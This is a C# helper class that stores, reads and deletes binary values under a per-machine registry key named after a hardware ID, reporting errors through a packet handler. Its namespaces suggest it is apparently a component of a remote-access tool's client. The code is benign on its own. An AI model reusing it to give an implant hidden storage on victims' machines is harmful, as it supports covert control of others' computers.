using System;
using Client.Handle_Packet;
using Microsoft.Win32;

namespace Client.Helper;

public static class SetRegistry
{
	private static readonly string ID = "Software\\" + Settings.Hwid;

	public static bool SetValue(string name, byte[] value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.SetValue(name, value, RegistryValueKind.Binary);
			return true;
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
		return false;
	}

	public static byte[] GetValue(string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID);
			return (byte[])registryKey.GetValue(value);
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
		return null;
	}

	public static bool DeleteValue(string name)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID);
			registryKey.DeleteValue(name);
			return true;
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
		return false;
	}

	public static bool DeleteSubKey()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", writable: true);
			registryKey.DeleteSubKeyTree(ID);
			return true;
		}
		catch (Exception ex)
		{
			Packet.Error(ex.Message);
		}
		return false;
	}
}
